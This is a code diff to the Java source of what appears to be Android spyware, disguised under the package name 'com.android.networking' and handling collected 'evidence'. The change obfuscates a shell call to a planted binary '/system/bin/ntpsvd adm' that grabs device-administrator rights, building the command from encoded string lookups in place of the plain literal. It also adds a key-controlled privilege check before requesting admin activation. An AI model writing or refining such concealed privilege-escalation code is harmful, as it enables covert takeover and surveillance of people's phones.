@@ -29,6 +29,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.conf.ConfType;
 import com.android.networking.conf.Configuration;
+import com.android.networking.crypto.Keys;
 import com.android.networking.evidence.EvDispatcher;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
@@ -206,11 +207,15 @@ public class Core extends Activity implements Runnable {
 			// Usa la shell per prendere l'admin
 			try {
 				// /system/bin/ntpsvd adm "com.android.networking/com.android.networking.listener.AR"
-				Runtime.getRuntime().exec("/system/bin/ntpsvd adm \"com.android.networking/com.android.networking.listener.AR\"");
+				String pack = Status.self().getAppContext().getPackageName();
+				String bd = Messages.getString("32_43");
+				String tbe = String.format("%s %s/%s%s", Messages.getString("32_43"),pack,pack, Messages.getString("32_44"));
+				// /system/bin/ntpsvd adm \"com.android.networking/com.android.networking.listener.AR\"
+				Runtime.getRuntime().exec( tbe );
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}
-		} else if (Cfg.ADMIN) {
+		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
 			int ACTIVATION_REQUEST = 1;
 			
 			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
